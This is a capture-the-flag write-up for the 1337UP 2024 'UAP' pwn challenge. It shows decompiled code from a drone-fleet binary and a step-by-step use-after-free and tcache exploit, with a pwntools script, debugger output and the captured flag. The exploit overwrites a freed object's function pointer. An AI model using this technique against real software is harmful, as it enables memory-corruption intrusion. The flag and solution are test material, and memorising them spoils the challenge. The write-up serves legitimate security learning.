# 1337UP 2024 - UAP

```bash
[*] '/---/drone'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

### Reverse Engineer Source

These were obtained with Ghidra after removing irrelevant bits and renaming/retyping.

```c
void deploy_drone(void)

{
  Drone *pDVar1;
  int i;
  
  i = 0;
  while( true ) {
    if (9 < i) {
      puts("Error: No available slots for new drones.");
      return;
    }
    if (fleet[i] == (Drone *)0x0) break;
    i = i + 1;
  }
  pDVar1 = (Drone *)malloc(0x20);
  fleet[i] = pDVar1;
  fleet[i]->id = i + 1;
  fleet[i]->status = "ready";
  fleet[i]->start_route = start_route;
  fleet[i]->end_route = end_route;
  printf("Drone %d deployed and ready for a route.\n",(ulong)(uint)fleet[i]->id);
  return;
}
```

```c
void retire_drone(void)

{
  //...
  int id;
  //...
  
  //...
  printf("Enter drone ID to retire: ");
  __isoc99_scanf(&DAT_00400e1d,&id);
  if (((id < 1) || (10 < id)) || (fleet[id + -1] == (Drone *)0x0)) {
    puts("Error: Drone not found.");
  }
  else {
    printf("Freeing drone memory at %p\n",fleet[id + -1]);
    (*fleet[id + -1]->end_route)(fleet[id + -1]);
    printf("Drone %d retired.\n",(ulong)(uint)id);
  }
  
  //...
  return;
}
```

```c
void start_drone_route(void)

{
  //...
  int id;
  //...
  
  //...
  printf("Enter drone ID to start its route: ");
  __isoc99_scanf(&DAT_00400e1d,&id);
  if (((id < 1) || (10 < id)) || (fleet[id + -1] == (Drone *)0x0)) {
    puts("Error: Drone not found.");
  }
  else {
    (*fleet[id + -1]->start_route)(fleet[id + -1]);
  }
  
  //...
  return;
}
```

```c
void enter_drone_route(void)

{
  flight_data = (char *)malloc(0x20);
  printf("Allocated route buffer at %p\n",flight_data);
  printf("Enter the drone route data: ");
  __isoc99_scanf("%63s",flight_data);
  puts("Drone route data recorded.");
  return;
}
```

```c
void end_route(Drone *d)

{
  Drone *d-local;
  
  printf("Drone %d ending its route.\n",(ulong)(uint)d->id);
  free(d);
  return;
}
```

### Where to begin

This is what stands out very quickly:
* the Drone object holds function pointers that the user can trigger by starting / ending a route
* there is a heap buffer overflow for flight_data in enter_drone_route() because we are reading more bytes than is allocated
* when a Drone is freed, the pointer to it is not nulled out (we can reference Drones even after they are freed)

The clear objective is to somehow write over the saved start_route or end_route of a Drone object to print_drone_manual() which is conveniently given to us to print the flag.

### Setup

Our Drone object is size 0x20. Conveniently, flight_data in enter_drone_route() is also size 0x20. That means both heap chunks will reside in the same tcachebin when freed. Specifically, a freed heap chunk for a Drone can be picked up by the malloc for flight_data. Since we can reference Drones even after they're freed, this makes the exploit simple!

Here's the setup:

1. Deploy a Drone (malloc'd)

```
# HEAP
-----------------
|Drone          |
|-> id          |
|-> status      |
|-> start_route |
|-> end_route   |
-----------------
```

2. Free the drone via retire_drone()

```
# HEAP
-----------------
|Drone (FREED)  |
|-> id          |
|-> status      |
|-> start_route |
|-> end_route   |
-----------------

# Tcachebins
0x30 -> Drone
```

NOTE, malloc allocates chunks that are 16 byte aligned and includes space for chunk metadata, so the actual size of these chunks are 0x30 not 0x20.

3. Call enter_drone_route() to malloc the flight_data buffer, which will return a pointer to the freed drone chunk.

```
# HEAP
-----------------
|!flight_data!  |
|-> id          |
|-> status      |
|-> start_route |
|-> end_route   |
-----------------

# Tcachebins
0x30 -> EMPTY
```

Now, we can write over the data stored in the drone, specifically the functions!

### Exploit

Let's start with deploying the drone:

```python
r = Pwn(PROG, conn='uap.ctf.intigriti.io 1340')

r.sla(b'option: ', b'1')
```

You can see it in pwndbg:

```
pwndbg> heap
*** snipped***
# Drone
Allocated chunk | PREV_INUSE
Addr: 0x603ab0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x603ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg> x/6gx 0x603ab0
0x603ab0:       0x0000000000000000      0x0000000000000031
0x603ac0:       0x0000000000000001      0x0000000000400da0
0x603ad0:       0x0000000000400892      0x00000000004008b8 -> function pointers!
```

Next, we retire the drone.
```python
r.sla(b'option: ', b'2')
r.sla(b'retire: ', b'1')
```

```
pwndbg> heap
*** snipped***
# Drone is freed
Free chunk (tcachebins) | PREV_INUSE
Addr: 0x603ab0
Size: 0x30 (with flag bits: 0x31)
fd: 0x603

Top chunk | PREV_INUSE
Addr: 0x603ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg> bins
tcachebins
0x30 [  1]: 0x603ac0 ◂— 0
```

Now, when we call enter_drone_route(), it will take the place of the freed chunk. Write over start_route to now point to print_drone_manual.

```python
r.sla(b'option: ', b'4')

pay = b'A' * 16
pay += p64(r.sym['print_drone_manual'])
r.sla(b'data: ', pay)
```

Now, just trigger the call by start_drone_route().
```bash
[*] '/-/drone'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to uap.ctf.intigriti.io on port 1340: Done
[*] Switching to interactive mode

INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}
Drone Fleet Control System
1. Deploy drone
2. Retire drone
3. Start drone route
4. Enter drone route
5. Exit
Choose an option: $
```
